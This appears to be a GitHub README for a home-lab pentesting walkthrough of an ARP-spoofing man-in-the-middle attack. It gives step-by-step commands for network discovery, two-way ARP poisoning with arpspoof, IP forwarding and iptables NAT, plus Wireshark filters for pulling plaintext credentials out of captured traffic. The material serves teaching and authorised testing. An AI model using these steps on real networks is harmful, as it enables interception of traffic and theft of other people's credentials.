# MITM ARP Spoofing Lab – Full Walkthrough

**Author:** Eliran Loai Deeb, Luai.io (Cybersecurity Consultant)
**Lab Environment**: Home/VM network, Kali Linux, Wireshark, VirtualBox/VMware

***

## 💡 Overview

This repository documents my hands-on process of executing a full ARP Spoofing MITM attack in a lab (home/virtual) environment. The project demonstrates every step required to intercept, analyze, and extract real user traffic between two networked devices, using only open source tools and standard UNIX commands.

I built and tested this workflow myself troubleshooting in real-time, hitting practical snags, and fine-tuning everything for a realistic pentesting scenario.
If you're a penetration tester, SOC analyst, or cyber student looking for the *real* story (errors, fixes, detailed commands, and live captures) you've come to the right place.

***

## 🛠️ Setup

- **Virtualization**: VM with “Bridged Adapter” (not NAT!) to appear as a real host on the LAN.
- **Attacker Machine**: Kali Linux (physical or VM) with Wireshark (or tcpdump).
- **Victim Machine**: Any Linux/Windows host on the same subnet.
- **Network Tools**: arp-scan, nmap, arpspoof, tcpdump, iptables.

***

## 🚦 Step-by-Step Flow

**1. Map the Network**
- Discover local devices and IPs:
```bash
arp-scan --interface=<iface> --localnet
nmap -sn <subnet>/24
```
- Match IP to MAC: Identify your victim, router, and attacker IPs.

**2. Verify VM Bridged Networking**
- Make sure attacker VM gets a real LAN IP (`ip a`), matches the subnet.

**3. Enable IP Forwarding**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

**4. Launch ARP Spoofing**
```bash
sudo arpspoof -i <iface> -t <victim_ip> <gateway_ip>
sudo arpspoof -i <iface> -t <gateway_ip> <victim_ip>
```
> Run each in a separate terminal to poison ARP tables in both directions.

**5. NAT Configuration (if needed)**
```bash
sudo iptables -t nat -A POSTROUTING -o <iface> -j MASQUERADE
sudo iptables -F
```

**6. Traffic Capture**
- Fire up Wireshark/tcpdump on the attacker VM, watch for traffic matching victim’s IP.

**7. Extract Sensitive Data**
- Filter HTTP/FTP/Telnet traffic:
```
http
ftp
telnet
ip.addr == <victim_ip>
```
- Use “Follow TCP Stream” for login forms or POST data.
- For HTTPS traffic see handshake, but not plaintext content (see SSLstrip below).

***

## ⚡ Troubleshooting

- **No traffic passes / slow connection?**
- Double check IP forwarding and NAT.
- Ensure correct network interface selection.
- Flush firewall rules periodically.
- Avoid VM resource bottlenecks.

- **Only see TLS/SSL traffic?**
- Victim is using HTTPS. Try surfing HTTP sites (e.g. http://neverssl.com) as a test.
- For advanced MITM over SSL, research `SSLstrip`.

- **Cannot see victim in scans?**
- Check Bridged mode, IP assignment, physical connection.

***

## 🎯 Results & Lessons

- Successfully performed ARP Spoofing. Intercepted and analyzed target traffic live.
- Saved .pcap sessions for offline analysis credentials, forms, DNS queries.
- Documented errors, tweaks, and fixes for future reference.

***

## 📦 Files Included

- Example Wireshark .pcap, screenshots (redacted).
- Shell scripts, command history.
- Detailed walkthrough doc.

***

## 📝 Credits / Usage

All code, techniques, and documentation here are for educational and authorized pentesting only.
Developed and field-tested by Eliran Loai Deeb, Luai.io.
Questions, feedback, collab reach out via GitHub or LinkedIn.

***

Want more? Star the repo, drop me a note, or fork your own MITM-lab!
